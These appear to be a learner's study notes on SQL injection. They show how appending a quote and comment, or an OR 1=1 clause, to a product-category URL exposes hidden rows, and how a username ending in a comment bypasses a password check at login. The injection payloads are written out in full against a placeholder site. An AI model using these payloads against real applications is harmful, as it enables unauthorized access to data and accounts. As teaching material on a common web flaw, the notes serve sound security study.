1. Retrieving hidden data

Going to a website that has a categories may have a url like:
https://www.website.com/products?category=Category1

The SQL statement behind the scenes may look something like this:
SELECT * FROM products WHERE category = 'Category1' AND available = 1

You can try and constructing a URL like: 
https://www.website.com/products?category=Category1'--

This results in a SQL statement behind the scenes that looks like:
SELECT * FROM products WHERE category = 'Category1'--' AND available = 1

RESULT: This would show all the products from a certain category, not just ones available to the public.

If there are hidden categories, you can try and constructing a URL like:
https://www.website.com/products?category=Category1'+OR+1=1--

This results in a SQL statement behind the scenes that looks like:
SELECT * FROM products WHERE category = 'Category1' OR 1=1-- AND available = 1

RESULT: This would show all products no matter what category or availability because logically 1 always equals 1.


2. Subverting Application Logic

There may be a SQL statement behind the scenes that logs in the user like so:
SELECT * FROM users WHERE username = 'smmacander' AND password = 'password123'

Using the logic from (1.), a statement like this can easily be created:
SELECT * FROM users WHERE username = 'smmacander'--' AND password = 'password123'

This can be done by inputting:
smmacander'-- into the username field.
